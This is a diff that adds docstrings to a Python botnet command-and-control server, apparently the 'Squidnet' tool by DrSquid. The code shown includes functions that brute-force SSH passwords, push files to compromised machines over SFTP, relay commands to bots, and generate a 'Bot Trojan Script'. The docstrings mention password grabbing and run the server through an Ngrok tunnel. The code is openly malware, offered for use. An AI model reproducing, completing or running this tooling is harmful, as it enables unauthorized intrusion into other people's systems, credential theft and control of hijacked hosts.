@@ -8,6 +8,7 @@ class ArguementParse:
         else:
             self.get_args()
     def downloadNgrok(self):
+        """Downloads Ngrok for windows."""
         print("[+] Downloading Ngrok.....\n")
         if sys.platform == "win32":
             batfile = open("getNgrok.bat","w")
@@ -25,6 +26,9 @@ tar -xf {os.getcwd()}/ngrok.zip
         print("[+] Run 'ngrok tcp 80' to start an Ngrok domain after finishing.")
         sys.exit()
     def usage(self):
+        """Displays help for arguement parsing(good for first time users).
+        Allows the user to know what the arguements do as well as well as
+        how to use them."""
         print("""
   _____             _     _ _   _      _           _  _   _____ 
  / ____|           (_)   | | \ | |    | |         | || | | ____|
@@ -62,6 +66,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
 [+] Squidnet --gN""")
         sys.exit()
     def get_args(self):
+        """Arguement Parsing function for initiating the Botnet."""
         opt = OptionParser()
         opt.add_option("--ip", "--ipaddr", dest="ip")
         opt.add_option("--p", "--port", dest="port")
@@ -125,11 +130,17 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
             ngrokport = None
         self.botnet = Botnet(ip, port, adminuser, adminpass, key, passfile, ngrokhost, ngrokport)
 class Botnet:
+    """Main Class Made for the BotNet. Everything important
+    and needed for the Botnet is located in this class."""
     class NotSamePassException(Exception):
         def __init__(self, msg=f"Configured Password is the the same as one in server txt file!"):
+            """Little Error for the password configuration."""
             self.msg = msg
             super().__init__(NotSamePassException)
     def __init__(self, ip, port, name, passw, key, passwfile, ngroklink=None, ngrokport=None):
+        """Initiation of the main script. Definition of socket server, ngrok hosts, logging, etc
+        are created. There are also definition of variables that are vital to the overall script
+        that are defined here as well. Logging is also started."""
         self.ip = ip
         self.port = int(port)
         self.name = name
@@ -186,6 +197,7 @@ class Botnet:
         self.instructor.start()
 
     def log_logo(self):
+        """Logo of this script."""
         logo = """
   _____             _     _ _   _      _           _  _   _____ 
  / ____|           (_)   | | \ | |    | |         | || | | ____|
@@ -198,6 +210,7 @@ class Botnet:
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
+        """Logo of this script."""
         print("""
   _____             _     _ _   _      _           _  _   _____ 
  / ____|           (_)   | | \ | |    | |         | || | | ____|
@@ -209,6 +222,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
            |_|                                                  
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
     def usage(self):
+        """This displays the list of commands on the server that can be sent to the bots."""
         print("\n[+] Commands:\n")
         print("[+] !help                        - Displays all of the commands.")
         print("[+] !whatsnew                    - Displays all new features.")
@@ -248,6 +262,9 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
         print("[+] !listsshbots                 - Lists all SSH Bots")
         print("\n[+] Any other commands will be made into cmd commands.\n")
     def configure_adminfile(self):
+        """Creates a file with the admin username and the password.
+        The password will be hashed and put into the file, where
+        it will be referred to if an admin tries to log into the server."""
         try:
             admin_file = open('admin.txt', 'r')
             username_password = admin_file.read()
@@ -274,6 +291,10 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
                 tokenfile.write(str(key))
                 tokenfile.close()
     def listen(self):
+        """This function listens for connections from admins and bots alike.
+        The first message recieved will be interpreted as the name of the device
+        and it will displayed for the Admins to see. A thread is created for the
+        handling of the connection."""
         while True:
             try:
                 flag = 0
@@ -288,6 +309,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
             except Exception as e:
                 self.log(f"\n[(ERROR)]: {str(e)}")
     def log(self, msg):
+        """Logs server output."""
         try:
             self.serverlog = open(self.logfile, 'r')
             contents = self.serverlog.read()
@@ -301,6 +323,11 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
             self.serverlog.write(msg)
             self.serverlog.close()
     def handler(self, c, hostname, number):
+        """Function recieves packets from the connections. This is needed for clients
+        to send packets to the botnet so the Admin can see what the Bots are sending.
+        This is needed also for password grabbing and information obtaining. This
+        function is also important for admin connections as they need to send and
+        recieve packets."""
         admin = False
         isbot = False
         self.savefile = False
@@ -508,6 +535,9 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
                 c.close()
                 break
     def ssh_login(self, ip, username, password):
+        """Does regular logging in with SSH into the provided ip and username. There is no
+        brute-forcing since a password arguement has be passed, and that the brute-force text
+        file is not used."""
         print(f"[+] Attempting to login to {ip}@{username}\n[+] With password: {password}")
         msgtoadmin = f"[(SERVER)]: Attempting to login to {ip}@{username}\n[(SERVER)]: With password: {password}"
         self.log('\n' + msgtoadmin)
@@ -542,6 +572,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
                 except:
                     pass
     def ssh_infect(self, ip, username):
+        """Attempts to brute force the ip and username with the password list provided
+        from the txt file specified in the __init__ function."""
         print(f"[+] Brute Forcing the Password for: {username}@{ip}\n")
         msgtoadmin = f"[(SERVER)]: Brute Forcing the Password for: {username}@{ip}\n"
         self.log('\n' + msgtoadmin)
@@ -585,6 +617,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
                     pass
             print(f"[?] Unable to Brute Force password for {username}@{ip}")
     def send_ssh(self, instruction):
+        """Sends instructions to the SSH-Bots. The output will also be sent
+        back to the Server for the admins to see."""
         for bot in self.ssh_bots:
             for usernames in self.ssh_botlist:
                 if str(bot) in usernames:
@@ -605,6 +639,8 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
                     except:
                         self.log(f"[(ERROR)]: Unable to send message to {admin}.")
     def ssh_inject(self, client, file):
+        """This function Opens up SFTP(Secure File Transfer Protocol) and sends a file
+        to the SSH-Bots, where they can be opened up on command."""
         if "/" in file or "\\" in file:
             result = ""
             for letter in file:
@@ -633,6 +669,9 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
             sftp.put(file, f'/Users/{username}/{file}')
         os.chdir(self.cwd)
     def instruct(self):
+        """Server-Side Sending intructions to the bots. This is so that the Server
+        can also send packets to the Bots which they can send info back to the Server
+        and admins."""
         self.savefile = False
         while True:
             try:
@@ -733,6 +772,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
             except Exception as e:
                 self.log(f"\n[(ERROR)]: {str(e)}")
     def gen_admin(self):
+        """Generates the admin for remote admin connections to the BotNet."""
         script = """
 import socket, threading, os, time
 class BotMaster:
@@ -805,6 +845,8 @@ admin = BotMaster('""" + self.ngroklink + """',""" + str(
         """
         return script
     def bot_script(self):
+        """Generates the Bot Trojan Script needed to connect to this server and run commands from it.
+        Test it and see what it does!"""
         script = """
 import socket, time, os, threading, urllib.request, shutil, sys, random, base64, sqlite3, json
 import subprocess, re
